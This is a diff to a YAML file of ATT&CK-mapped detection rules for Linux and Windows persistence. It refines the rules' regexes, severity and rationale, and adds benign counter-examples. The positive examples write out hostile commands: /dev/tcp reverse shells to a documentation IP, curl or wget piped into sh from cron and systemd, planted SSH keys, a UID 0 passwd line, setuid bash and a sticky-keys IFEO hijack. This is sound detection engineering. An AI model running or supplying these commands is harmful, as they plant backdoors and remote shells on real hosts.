@@ -7,7 +7,7 @@
 # do: a downloader or socket inside the persisted command, a temp-directory payload, or a root-equivalent grant.
 
 - id: mention.persist_authorized_keys_echo_append
-  title: SSH public key appended to authorized_keys with echo
+  title: 'echo of an SSH public key with >> into authorized_keys'
   match:
     anchored: 'echo {1,3}["'']?(?:ssh-(?:rsa|ed25519|dss)|ecdsa-sha2-nistp[0-9]{3}) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}[^\n]{0,80}authorized_keys'
   case_sensitive: false
@@ -20,9 +20,10 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1098.004
   rationale: >-
-    Appending a key to authorized_keys from the command line is how worms (TeamTNT, Kinsing) and hands-on intruders
-    keep SSH access. Administrators normally use ssh-copy-id or configuration management, but some paste keys by
-    hand, so for an ordinary account it is medium; the root-account entry is strong.
+    Author-composed shape from the technique text (authorized_keys). Appending a key to authorized_keys from the
+    command line is how worms (TeamTNT, Kinsing) and hands-on intruders keep SSH access. Administrators normally use
+    ssh-copy-id or configuration management, but some paste keys by hand, so for an ordinary account it is medium; the
+    root-account entry is strong.
   examples:
     positive:
       - 'Nov 20 13:00:00 web01 bash[800]: HISTORY: echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7vH3kq2mZ9xY1pQ8rT5uW4e attacker" >> /home/www/.ssh/authorized_keys'
@@ -31,11 +32,11 @@
       - 'Nov 20 13:00:02 web01 bash[802]: HISTORY: ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@web02'
 
 - id: mention.persist_root_authorized_keys_append
-  title: SSH public key appended to root's authorized_keys
+  title: 'SSH public key with >> into /root/.ssh/authorized_keys'
   match:
     anchored: 'ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/]{40,1000}={0,3}[^\n]{0,120}>> {0,2}/root/\.ssh/authorized_keys'
   case_sensitive: false
-  strength: strong
+  strength: medium
   attack: [T1098.004]
   telemetry: [linux_text]
   source:
@@ -44,8 +45,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1098.004
   rationale: >-
-    A key written straight into root's authorized_keys from a command line gives permanent root SSH access; cloud
-    worms and exploit payloads do this. Fleet key management writes through its own tooling, not echo appends.
+    Author-composed shape from T1098.004: a key written straight into root's authorized_keys from a command line.
+    Cloud worms and exploit payloads do this, and so do first-boot provisioning scripts on images without cloud-init,
+    so it is medium; the key comment and the process that wrote it decide.
   examples:
     positive:
       - 'Nov 20 13:01:00 web01 sh[803]: echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf3kq2mZ9xY1pQ8rT5uW4eZ0b root@x >> /root/.ssh/authorized_keys'
@@ -54,11 +56,11 @@
       - 'Nov 20 13:01:02 web01 bash[805]: HISTORY: cat /root/.ssh/authorized_keys'
 
 - id: mention.persist_authorized_keys_immutable
-  title: authorized_keys made immutable or append-only
+  title: 'chattr +i or +a on authorized_keys (command text)'
   match:
     anchored: 'chattr {1,3}\+[aiu]{1,3} {1,3}[^\n]{0,80}authorized_keys'
   case_sensitive: false
-  strength: strong
+  strength: medium
   attack: [T1098.004, T1222.002]
   telemetry: [linux_text]
   source:
@@ -67,8 +69,8 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1222.002
   rationale: >-
-    TeamTNT's documented chattr use, applied to the SSH key file of T1098.004: locking authorized_keys after planting
-    a key stops the owner and other malware from removing it. Administrators have no reason to freeze the file.
+    TeamTNT's documented chattr use (T1222.002), applied to the key file of T1098.004: locking authorized_keys after
+    planting a key stops removal. Some hardening guides also freeze key files, so it is medium.
   examples:
     positive:
       - 'Nov 20 13:02:00 web01 sh[806]: chattr +ia /root/.ssh/authorized_keys'
@@ -77,7 +79,7 @@
       - 'Nov 20 13:02:02 web01 bash[808]: HISTORY: chmod 600 ~/.ssh/authorized_keys'
 
 - id: mention.persist_cron_every_minute_downloader
-  title: Cron schedule running a downloader piped into a shell
+  title: 'Cron schedule line with a downloader and a pipe into a shell'
   match:
     anchored: '\* \* \* \* [^\n]{0,60}(?:curl|wget)[^\n]{1,200}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
   case_sensitive: false
@@ -90,9 +92,10 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1053.003
   rationale: >-
-    A crontab line (every minute or every N minutes, both end in '* * * *') that fetches a script and pipes it into a
-    shell re-infects the host on a timer; it is the persistence of miners and botnets. Scheduled maintenance runs
-    local scripts, not remote content piped into a shell.
+    Author-composed shape from the technique text (crontab); strong because the line pipes remote content into a shell
+    on a timer. A crontab line (every minute or every N minutes, both end in '* * * *') that fetches a script and
+    pipes it into a shell re-infects the host on a timer; it is the persistence of miners and botnets. Scheduled
+    maintenance runs local scripts, not remote content piped into a shell.
   examples:
     positive:
       - 'Nov 20 13:03:00 web01 CRON[809]: (www-data) CMD (*/5 * * * * curl -fsSL http://203.0.113.7/cr.sh | sh)'
@@ -102,9 +105,9 @@
       - '*/5 * * * * root /usr/local/bin/backup.sh > /dev/null 2>&1'
 
 - id: mention.persist_cron_reboot_payload
-  title: '@reboot cron entry running a downloader, socket or decoder'
+  title: '@reboot cron line with a pipe into a shell, a socket or a temp-directory payload'
   match:
-    anchored: '@reboot[^\n]{1,200}(?:curl |wget |/dev/tcp/|nc -e|base64 -d)'
+    anchored: '@reboot[^\n]{1,200}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/|nc -e |(?:/tmp|/var/tmp|/dev/shm)/[^\s/]{1,60})'
   case_sensitive: false
   strength: strong
   attack: [T1053.003, T1105]
@@ -115,20 +118,23 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1053.003
   rationale: >-
-    An @reboot job that downloads, opens a socket or decodes base64 restores an implant at every boot; the
-    technique's procedure examples include @reboot persistence (GoldMax, The Gentlemen ransomware). Services start
-    from systemd, not from a cron reboot line that reaches out to the network.
+    An @reboot job that pipes downloaded content into a shell, opens a bash socket or runs a file from a temp
+    directory restores an implant at every boot; the technique's procedure examples include @reboot persistence
+    (GoldMax, The Gentlemen ransomware). Health pings ('@reboot curl -fsS https://hc-ping... > /dev/null') and local
+    scripts are not matched.
   examples:
     positive:
       - '@reboot /bin/bash -c "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"'
+      - '@reboot sleep 60 && /tmp/.vmware-authd'
     negative:
       - '@reboot /usr/local/bin/start-dashboard.sh'
       - 'Nov 20 13:04:00 web01 cron[700]: (CRON) INFO (Running @reboot jobs)'
+      - '@reboot curl -fsS -m 10 --retry 5 -o /dev/null https://hc-ping.example.org/eb095278'
 
 - id: mention.persist_crontab_from_echo_downloader
-  title: Crontab installed from echo text that contains a downloader or socket
+  title: 'echo of a downloader-and-shell-pipe or socket line into crontab -'
   match:
-    anchored: 'echo [^\n]{1,300}(?:curl|wget|/dev/tcp/)[^\n]{0,200}\| {0,2}crontab {1,3}-'
+    anchored: 'echo [^\n]{1,120}(?:(?:curl|wget) [^\n|]{1,150}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/)[^\n]{0,60}\| {0,2}crontab {1,3}-'
   case_sensitive: false
   strength: strong
   attack: [T1053.003, T1105]
@@ -139,17 +145,19 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1053.003
   rationale: >-
-    Replacing a user's crontab with echoed text that fetches remote content installs scheduled re-infection in one
-    command, the usual exploit-payload persistence. Admins edit with crontab -e or manage /etc/cron.d files.
+    Author-composed shape from the technique text (crontab). Replacing a user's crontab with echoed text whose command
+    pipes remote content into a shell (or opens a bash socket) installs scheduled re-infection in one command, the
+    usual exploit-payload persistence. Health-check pings without a shell pipe are not matched.
   examples:
     positive:
       - 'Nov 20 13:05:00 web01 sh[811]: echo "*/10 * * * * wget -q -O - http://203.0.113.7/a | sh" | crontab -'
     negative:
       - 'Nov 20 13:05:01 web01 bash[812]: HISTORY: echo "0 2 * * * /usr/local/bin/backup.sh" | crontab -'
       - 'Nov 20 13:05:02 web01 bash[813]: HISTORY: crontab -l'
+      - 'echo ''*/5 * * * * curl -fsS -m 10 https://hc-ping.example.org/eb095278'' | crontab -'
 
 - id: mention.persist_crontab_append_pipeline
-  title: Crontab rewritten by appending an echoed line
+  title: 'crontab -l; echo ... | crontab - pipeline text'
   match:
     anchored: 'crontab {1,3}-l[^\n]{0,20}; {0,2}echo [^\n]{1,300}\| {0,2}crontab {1,3}-'
   case_sensitive: false
@@ -162,8 +170,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1053.003
   rationale: >-
-    '(crontab -l; echo "...") | crontab -' adds a job without an editor, which is how scripts and intruders persist.
-    Install scripts use it too, so it is medium; the appended command decides.
+    Author-composed shape from the technique text (crontab). '(crontab -l; echo "...") | crontab -' adds a job without
+    an editor, which is how scripts and intruders persist. Install scripts use it too, so it is medium; the appended
+    command decides.
   examples:
     positive:
       - 'Nov 20 13:06:00 web01 sh[814]: (crontab -l 2>/dev/null; echo "@hourly /tmp/.x/upd") | crontab -'
@@ -172,7 +181,7 @@
       - 'Nov 20 13:06:02 web01 bash[816]: HISTORY: crontab -e'
 
 - id: mention.persist_cron_file_echo
-  title: Text echoed into a system cron file or directory
+  title: 'echo into a system cron file or directory (command text)'
   match:
     anchored: 'echo [^\n]{1,300}>{1,2} {0,2}/etc/cron(?:tab|\.d/|\.hourly/|\.daily/|\.weekly/|\.monthly/)'
   case_sensitive: false
@@ -185,8 +194,8 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1053.003
   rationale: >-
-    Writing a system cron entry with echo from a shell is a direct persistence edit. Some provisioning scripts do the
-    same, so it is medium.
+    Author-composed shape from the technique text (crontab). Writing a system cron entry with echo from a shell is a
+    direct persistence edit. Some provisioning scripts do the same, so it is medium.
   examples:
     positive:
       - 'Nov 20 13:07:00 web01 sh[817]: echo "* * * * * root /dev/shm/.k" > /etc/cron.d/0hourly2'
@@ -195,9 +204,9 @@
       - 'Nov 20 13:07:02 web01 bash[819]: HISTORY: echo "cron jobs reviewed" >> /var/log/audit-notes.txt'
 
 - id: mention.persist_ld_preload_temp_library
-  title: LD_PRELOAD set to a library in a temp or current directory
+  title: 'LD_PRELOAD= with a temp-directory library path'
   match:
-    anchored: 'LD_PRELOAD= {0,2}["'']?(?:/tmp/|/dev/shm/|/var/tmp/|\./)'
+    anchored: 'LD_PRELOAD= {0,2}[\"'']?(?:/tmp/|/dev/shm/|/var/tmp/)'
   case_sensitive: true
   strength: strong
   attack: [T1574.006]
@@ -208,9 +217,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1574.006
   rationale: >-
-    Preloading a shared object from /tmp, /dev/shm or the current directory injects attacker code into the next
-    program (and is a classic local privilege escalation with sudo env_keep). Legitimate preloads (jemalloc,
-    tcmalloc, libfaketime) come from system library paths.
+    Author-composed shape from T1574.006: preloading a shared object from /tmp, /dev/shm or /var/tmp injects code into
+    the next program and is a classic local privilege escalation with sudo env_keep. Legitimate preloads (jemalloc,
+    tcmalloc, libfaketime) come from system library paths. The current-directory form is a separate medium entry.
   examples:
     positive:
       - 'Nov 20 13:08:00 web01 bash[820]: HISTORY: sudo LD_PRELOAD=/tmp/x.so apache2'
@@ -218,8 +227,31 @@
       - 'Nov 20 13:08:01 web01 systemd[1]: app.service: Environment LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2'
       - 'Nov 20 13:08:02 web01 bash[821]: HISTORY: echo $LD_LIBRARY_PATH'
 
+- id: mention.persist_ld_preload_cwd_library
+  title: LD_PRELOAD= with a current-directory library path
+  match:
+    anchored: 'LD_PRELOAD= {0,2}["'']?\./'
+  case_sensitive: true
+  strength: medium
+  attack: [T1574.006]
+  telemetry: [linux_text]
+  source:
+    name: MITRE ATT&CK Enterprise 20.0, T1574.006 Dynamic Linker Hijacking
+    url: https://attack.mitre.org/techniques/T1574/006
+    license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
+    upstream_id: T1574.006
+  rationale: >-
+    Author-composed shape from the technique text: a library preloaded from the current directory. Exploit code uses
+    it, and so do developers testing their own builds, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 13:08:03 web01 bash[822]: HISTORY: LD_PRELOAD=./libhook.so /usr/bin/passwd'
+    negative:
+      - 'Nov 20 13:08:04 web01 systemd[1]: app.service: Environment LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2'
+      - 'Nov 20 13:08:05 web01 bash[823]: HISTORY: LD_LIBRARY_PATH=./lib ./app'
+
 - id: mention.persist_ld_so_preload_write
-  title: Text written into /etc/ld.so.preload
+  title: 'echo into /etc/ld.so.preload (command text)'
   match:
     anchored: 'echo [^\n]{1,200}>{1,2} {0,2}/etc/ld\.so\.preload'
   case_sensitive: true
@@ -232,8 +264,10 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1574.006
   rationale: >-
-    Writing a library path into the global preload file loads it into every dynamically linked program; userland
-    rootkits and miner kits install this way. Packages that need preloading ship the file, they do not echo into it.
+    Author-composed shape; ATT&CK procedure examples (Rocke, Hildegard, TeamTNT) write /etc/ld.so.preload, and no
+    package echoes into it, hence strong. Writing a library path into the global preload file loads it into every
+    dynamically linked program; userland rootkits and miner kits install this way. Packages that need preloading ship
+    the file, they do not echo into it.
   examples:
     positive:
       - 'Nov 20 13:09:00 web01 sh[822]: echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
@@ -242,9 +276,9 @@
       - 'Nov 20 13:09:02 web01 bash[824]: HISTORY: echo /opt/lib > /etc/ld.so.conf.d/opt.conf'
 
 - id: mention.persist_setuid_in_temp
-  title: setuid or setgid bit set on a file in a temp directory
+  title: 'chmod setuid mode on a temp-directory path'
   match:
-    anchored: 'chmod {1,3}(?:u\+s|g\+s|\+s|[2467][0-7]{3}) {1,3}[^\n]{0,60}(?:/tmp/|/dev/shm/|/var/tmp/)'
+    anchored: 'chmod {1,3}(?:u\+s|\+s|[4567][0-7]{3}) {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\s;&|]{1,100}'
   case_sensitive: true
   strength: strong
   attack: [T1548.001]
@@ -255,9 +289,10 @@
     license: DRL-1.1
     upstream_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
   rationale: >-
-    Narrows the rule (chown root plus chmod u+s or g+s) to the strongest case: a setuid or setgid file in a
-    world-writable temp directory is a planted privilege-escalation backdoor. Packages install setuid binaries under
-    /usr, never in /tmp.
+    Narrows the rule (chown root plus chmod u+s or g+s on one command line) to a setuid mode applied directly to a
+    path in a world-writable temp directory, a planted privilege-escalation backdoor. The rule's 'chown root'
+    requirement is dropped because the chown is often a separate log line; setgid modes (2775 on shared directories)
+    and paths after '&&' or ';' are not matched. Packages install setuid binaries under /usr, never in /tmp.
   examples:
     positive:
       - 'Nov 20 13:10:00 web01 bash[825]: HISTORY: chmod 4755 /tmp/.bash'
@@ -265,11 +300,13 @@
     negative:
       - 'Nov 20 13:10:02 web01 bash[827]: HISTORY: chmod 1777 /tmp'
       - 'Nov 20 13:10:03 web01 bash[828]: HISTORY: chmod 755 /tmp/build/run.sh'
+      - 'Nov 20 13:10:04 web01 bash[828]: HISTORY: chmod 2775 /tmp/shared'
+      - 'Nov 20 13:10:05 web01 bash[828]: HISTORY: chmod 4755 /usr/local/bin/tool && cp build.log /tmp/'
 
 - id: mention.persist_setuid_system_shell
-  title: setuid bit set on a system shell
+  title: 'chmod setuid mode on a system shell (command text)'
   match:
-    anchored: 'chmod {1,3}(?:u\+s|\+s|[2467][0-7]{3}) {1,3}(?:/usr)?/bin/(?:ba|da|z|k|a)?sh\b'
+    anchored: 'chmod {1,3}(?:u\+s|\+s|[4567][0-7]{3}) {1,3}(?:/usr)?/bin/(?:ba|da|z|k|a)?sh\b'
   case_sensitive: true
   strength: strong
   attack: [T1548.001]
@@ -280,8 +317,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1548.001
   rationale: >-
-    A setuid shell ('bash -p' then gives a root shell to anyone) is the simplest root backdoor; no distribution ships
-    a setuid shell.
+    Author-composed shape from the technique text (chmod, setuid); strong because no distribution ships a setuid
+    shell. A setuid shell ('bash -p' then gives a root shell to anyone) is the simplest root backdoor; no distribution
+    ships a setuid shell.
   examples:
     positive:
       - 'Nov 20 13:11:00 web01 bash[829]: HISTORY: chmod u+s /bin/bash'
@@ -290,7 +328,7 @@
       - 'Nov 20 13:11:02 web01 bash[831]: HISTORY: ls -l /bin/bash'
 
 - id: mention.persist_shell_copied_to_temp
-  title: System shell copied into a temp directory
+  title: 'cp of a system shell into a temp directory (command text)'
   match:
     anchored: 'cp /(?:usr/)?bin/(?:ba|da|z|k|a)?sh {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)'
   case_sensitive: true
@@ -303,8 +341,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1548.001
   rationale: >-
-    Copying a shell into a temp directory is the first step of a setuid shell backdoor (copy, then chmod 4755). Test
-    harnesses occasionally copy shells into sandboxes, so alone it is medium.
+    Author-composed shape from the technique text. Copying a shell into a temp directory is the first step of a setuid
+    shell backdoor (copy, then chmod 4755). Test harnesses occasionally copy shells into sandboxes, so alone it is
+    medium.
   examples:
     positive:
       - 'Nov 20 13:12:00 web01 sh[832]: cp /bin/bash /tmp/.sh; chmod +s /tmp/.sh'
@@ -313,11 +352,11 @@
       - 'Nov 20 13:12:02 web01 bash[834]: HISTORY: cp /etc/bash.bashrc /tmp/bashrc.orig'
 
 - id: mention.persist_sudoers_nopasswd_append
-  title: Passwordless sudo-to-everything appended to sudoers
+  title: 'echo of a NOPASSWD: ALL grant with >> into /etc/sudoers'
   match:
-    anchored: 'echo [^\n]{1,160}NOPASSWD: {0,2}ALL[^\n]{0,80}>> {0,2}/etc/sudoers'
+    anchored: 'echo [^\n]{1,160}NOPASSWD: {0,2}ALL[^\n]{0,80}>> {0,2}/etc/sudoers(?:[^.\w/]|$)'
   case_sensitive: true
-  strength: strong
+  strength: medium
   attack: [T1548.003, T1098]
   telemetry: [linux_text]
   source:
@@ -327,8 +366,9 @@
     upstream_id: ddb26b76-4447-4807-871f-1b035b2bfa5d
   rationale: >-
     The rule flags writes to sudoers; this is the command-line form of the most dangerous write, an unrestricted
-    passwordless grant appended with echo. Administrators edit sudoers with visudo or drop-in files from
-    configuration management.
+    passwordless grant appended to /etc/sudoers itself (drop-in files under /etc/sudoers.d are not matched). Vagrant
+    and Packer base-image builds append exactly this line for their build user, so it is medium; the account named and
+    the host role decide.
   examples:
     positive:
       - 'Nov 20 13:13:00 web01 sh[835]: echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
@@ -350,7 +390,8 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1136.001
   rationale: >-
-    '-o -u 0' creates a second account with root's UID, a root backdoor under another name. There is no
+    Author-composed shape from the technique text (useradd); strong because a duplicate UID 0 has no administrative
+    use. '-o -u 0' creates a second account with root's UID, a root backdoor under another name. There is no
     administrative reason for a duplicate UID 0.
   examples:
     positive:
@@ -360,7 +401,7 @@
       - 'Nov 20 13:14:02 web01 bash[840]: HISTORY: useradd -r -u 999 svc_app'
 
 - id: mention.persist_passwd_uid0_append
-  title: UID 0 line appended to /etc/passwd
+  title: 'echo of a UID 0 line with >> into /etc/passwd'
   match:
     anchored: 'echo [^\n]{1,120}:0:0:[^\n]{0,120}>> {0,2}/etc/passwd'
   case_sensitive: true
@@ -373,8 +414,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1136.001
   rationale: >-
-    Appending a passwd line with UID and GID 0 creates a root account without the user tools, the usual move after a
-    file-write vulnerability. Account tools never echo into /etc/passwd.
+    Author-composed shape from the technique text; strong because account tools never echo into /etc/passwd. Appending
+    a passwd line with UID and GID 0 creates a root account without the user tools, the usual move after a file-write
+    vulnerability. Account tools never echo into /etc/passwd.
   examples:
     positive:
       - 'Nov 20 13:15:00 web01 sh[841]: echo ''hacker:$1$xyz$abc:0:0:root:/root:/bin/bash'' >> /etc/passwd'
@@ -383,7 +425,7 @@
       - 'Nov 20 13:15:02 web01 bash[843]: HISTORY: echo "alice:x:1001:1001::/home/alice:/bin/bash" > /tmp/passwd.test'
 
 - id: mention.persist_systemd_execstart_temp
-  title: systemd ExecStart pointing into a temp directory
+  title: 'systemd ExecStart= with a temp-directory executable'
   match:
     anchored: 'ExecStart= {0,2}[-@+!:]{0,3}(?:/tmp/|/dev/shm/|/var/tmp/)'
   case_sensitive: true
@@ -396,9 +438,10 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1543.002
   rationale: >-
-    A unit whose ExecStart executable (after systemd's optional '-@+!:' prefixes) lives in /tmp, /dev/shm or
-    /var/tmp persists a dropped payload as a service. Packaged and in-house services run from /usr, /opt or
-    application directories; a temp path that is only an argument (a docker volume, a cache directory) is not
+    Author-composed shape from the technique text (ExecStart); strong because packaged and in-house services never run
+    from temp directories. A unit whose ExecStart executable (after systemd's optional '-@+!:' prefixes) lives in
+    /tmp, /dev/shm or /var/tmp persists a dropped payload as a service. Packaged and in-house services run from /usr,
+    /opt or application directories; a temp path that is only an argument (a docker volume, a cache directory) is not
     matched.
   examples:
     positive:
@@ -408,7 +451,7 @@
       - 'Nov 20 13:16:02 web01 systemd[1]: systemd-tmpfiles-clean.service: Cleaning up temporary directories /tmp'
 
 - id: mention.persist_systemd_execstart_downloader
-  title: systemd ExecStart running a downloader piped into a shell
+  title: 'systemd ExecStart= line with a downloader and a pipe into a shell'
   match:
     anchored: 'ExecStart=[^\n]{0,80}(?:curl|wget)[^\n]{0,200}\| {0,2}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
   case_sensitive: true
@@ -421,8 +464,9 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1543.002
   rationale: >-
-    A service that fetches a script and pipes it into a shell at every start re-infects on boot; real services run
-    installed binaries.
+    Author-composed shape from the technique text (ExecStart); strong because the unit pipes remote content into a
+    shell at every start. A service that fetches a script and pipes it into a shell at every start re-infects on boot;
+    real services run installed binaries.
   examples:
     positive:
       - 'ExecStart=/bin/bash -c "curl -s http://203.0.113.7/s.sh | bash"'
@@ -431,9 +475,9 @@
       - 'ExecStart=/opt/app/bin/server --port 8080'
 
 - id: mention.persist_shell_rc_payload
-  title: Shell startup file appended with a downloader or socket command
+  title: 'echo of a downloader-and-shell-pipe or socket command into a shell startup file'
   match:
-    anchored: 'echo [^\n]{0,200}(?:curl |wget |/dev/tcp/|nc -e)[^\n]{0,200}>> {0,2}[^\n]{0,40}\.(?:bashrc|bash_profile|profile|zshrc)\b'
+    anchored: 'echo [^\n]{0,80}(?:(?:curl|wget) [^\n|]{1,150}\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|/dev/tcp/|nc -e )[^\n]{0,60}>> {0,2}[^\s]{0,40}\.(?:bashrc|bash_profile|profile|zshrc)\b'
   case_sensitive: true
   strength: strong
   attack: [T1546.004]
@@ -444,19 +488,21 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1546.004
   rationale: >-
-    Appending a network command to .bashrc or .profile runs it at every login. Users add PATH and alias lines to these
-    files, not downloaders or sockets.
+    Author-composed shape from T1546.004: appending a command that pipes remote content into a shell, opens a bash
+    socket or runs netcat -e to .bashrc or .profile runs it at every login. Echoed proxy settings or plain curl calls
+    are not matched.
   examples:
     positive:
       - 'Nov 20 13:17:00 web01 sh[845]: echo "nohup bash -c ''bash -i >& /dev/tcp/203.0.113.7/443 0>&1'' &" >> /home/alice/.bashrc'
     negative:
       - 'Nov 20 13:17:01 web01 bash[846]: HISTORY: echo ''export PATH=$PATH:/opt/tools/bin'' >> ~/.bashrc'
       - 'Nov 20 13:17:02 web01 bash[847]: HISTORY: echo "alias ll=''ls -la''" >> ~/.zshrc'
+      - 'echo ''export http_proxy=http://proxy:3128; curl -s https://status.example.org/'' >> ~/.bashrc'
 
 - id: mention.persist_rc_local_payload
-  title: rc.local appended with a downloader or socket command
+  title: 'echo of a downloader-with-shell or socket command into rc.local'
   match:
-    anchored: 'echo [^\n]{1,200}(?:curl|wget|/dev/tcp/)[^\n]{0,200}>> {0,2}/etc/rc\.local'
+    anchored: 'echo [^\n]{1,100}(?:(?:curl|wget) [^\n|]{1,150}(?:\| {0,3}(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b|&& {0,2}(?:sh|bash) )|/dev/tcp/)[^\n]{0,60}>> {0,2}/etc/rc\.local'
   case_sensitive: true
   strength: strong
   attack: [T1037.004, T1105]
@@ -467,17 +513,19 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1037.004
   rationale: >-
-    rc.local runs as root at boot; appending a network fetch or socket to it is boot persistence used by botnets.
-    Modern systems rarely use rc.local, and never for downloaders.
+    Author-composed shape from T1037.004: rc.local runs as root at boot; appending a fetch that is then run by a
+    shell, or a bash socket, is boot persistence used by botnets. Plain downloads echoed into rc.local are not
+    matched.
   examples:
     positive:
       - 'Nov 20 13:18:00 web01 sh[848]: echo "wget -q http://203.0.113.7/b -O /tmp/b && sh /tmp/b &" >> /etc/rc.local'
     negative:
       - 'Nov 20 13:18:01 web01 bash[849]: HISTORY: echo "/usr/local/bin/fan-control &" >> /etc/rc.local'
       - 'Nov 20 13:18:02 web01 bash[850]: HISTORY: cat /etc/rc.local'
+      - 'echo "curl -s -o /var/cache/motd.txt https://intranet.example.org/motd" >> /etc/rc.local'
 
 - id: mention.persist_insmod_from_temp
-  title: Kernel module loaded from a temp directory
+  title: 'insmod of a .ko file in a temp directory (command text)'
   match:
     anchored: 'insmod {1,3}(?:/tmp/|/dev/shm/|/var/tmp/)[^\n]{1,80}\.ko\b'
   case_sensitive: true
@@ -501,7 +549,7 @@
       - 'Nov 20 13:19:02 web01 bash[853]: HISTORY: insmod /lib/modules/6.8.0-45-generic/extra/vboxdrv.ko'
 
 - id: mention.persist_sticky_keys_cmd_copy
-  title: cmd.exe copied over an accessibility binary
+  title: 'copy /y of cmd.exe over an accessibility binary (command text)'
   match:
     anchored: 'copy {1,3}/y {1,3}C:\\windows\\system32\\cmd\.exe {1,3}C:\\windows\\system32\\(?:sethc|utilman|osk|magnify|narrator|displayswitch|atbroker)\.exe'
   case_sensitive: false
@@ -537,8 +585,10 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1546.008
   rationale: >-
-    A debugger registered for sethc.exe or utilman.exe under IFEO runs the attacker's program from the logon screen
-    as SYSTEM. No product configures IFEO for accessibility binaries.
+    Author-composed shape from the technique text (sethc, utilman, Image File Execution Options); strong because no
+    product configures IFEO for accessibility binaries. A debugger registered for sethc.exe or utilman.exe under IFEO
+    runs the attacker's program from the logon screen as SYSTEM. No product configures IFEO for accessibility
+    binaries.
   examples:
     positive:
       - 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe'
@@ -547,7 +597,7 @@
       - 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoRestartShell /t REG_DWORD /d 1'
 
 - id: mention.persist_run_key_suspicious_target
-  title: Run or RunOnce key pointing at a script host, LOLBin or temp path
+  title: '''Run'' or ''RunOnce'' key text with a script host, LOLBin or temp path'
   match:
     anchored: 'CurrentVersion\\Run(?:Once)?\b[^\n]{1,300}(?:powershell|mshta|rundll32 [^\n]{0,40}javascript|regsvr32|wscript|cscript|\\AppData\\Local\\Temp\\|\\Users\\Public\\|%TEMP%)'
   case_sensitive: false
@@ -560,9 +610,10 @@
     license: MITRE ATT&CK Terms of Use (royalty-free, copyright notice retained)
     upstream_id: T1547.001
   rationale: >-
-    An autorun that starts PowerShell, mshta, a script host or a binary from Temp or Public is the commodity malware
-    persistence. Some software starts helper scripts at logon, so it is medium; per-user app updaters under AppData
-    without Temp are not matched.
+    Author-composed shape from the technique text and procedures (CurrentVersion\Run). An autorun that starts
+    PowerShell, mshta, a script host or a binary from Temp or Public is the commodity malware persistence. Some
+    software starts helper scripts at logon, so it is medium; per-user app updaters under AppData without Temp are not
+    matched.
   examples:
     positive:
       - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "powershell -w hidden -enc SQBFAFgA" /f'
@@ -571,9 +622,9 @@
       - 'reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
 
 - id: mention.persist_schtasks_suspicious_action
-  title: Scheduled task created with an encoded, hidden or download command
+  title: 'schtasks /create text with an encoded, IEX, download or remote-HTA action'
   match:
-    anchored: 'schtasks(?:\.exe)?["'']? [^\n]{0,40}/create [^\n]{1,400}(?: -enc | -w hidden | bypass |\.DownloadString|\.DownloadFile|\.DownloadData|FromBase64String|mshta(?:\.exe)? http| IEX|/c start /min | -decode )'
+    anchored: 'schtasks(?:\.exe)?[\"'']? [^\n]{0,40}/create [^\n]{1,300}(?: -enc | -e [A-Za-z0-9+/]{20}|\.DownloadString|\.DownloadFile|\.DownloadData|FromBase64String|mshta(?:\.exe)? http| IEX)'
